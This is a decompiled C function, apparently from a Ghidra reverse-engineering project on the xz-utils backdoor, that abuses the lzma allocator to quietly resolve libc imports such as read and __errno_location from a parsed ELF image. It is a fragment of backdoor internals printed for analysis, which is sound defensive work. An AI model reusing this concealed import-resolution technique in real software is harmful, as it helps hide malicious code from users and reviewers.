// /home/kali/xzre-ghidra/xzregh/1045E0_resolve_libc_imports.c
// Function: resolve_libc_imports @ 0x1045E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall resolve_libc_imports(link_map * libc, elf_info_t * libc_info, libc_imports_t * imports)


BOOL resolve_libc_imports(link_map *libc,elf_info_t *libc_info,libc_imports_t *imports)

{
  uint uVar1;
  lzma_allocator *resolver;
  _func_25 *p_Var2;
  _func_26 *p_Var3;
  
  resolver = get_lzma_allocator();
  uVar1 = elf_parse(*(Elf64_Ehdr **)libc,libc_info);
  if (uVar1 != 0) {
    resolver->opaque = libc_info;
    p_Var2 = (_func_25 *)lzma_alloc(0x308,resolver);
    imports->read = p_Var2;
    if (p_Var2 != (_func_25 *)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    p_Var3 = (_func_26 *)lzma_alloc(0x878,resolver);
    imports->__errno_location = p_Var3;
    if (p_Var3 != (_func_26 *)0x0) {
      imports->resolved_imports_count = imports->resolved_imports_count + 1;
    }
    uVar1 = (uint)(imports->resolved_imports_count == 2);
  }
  return uVar1;
}

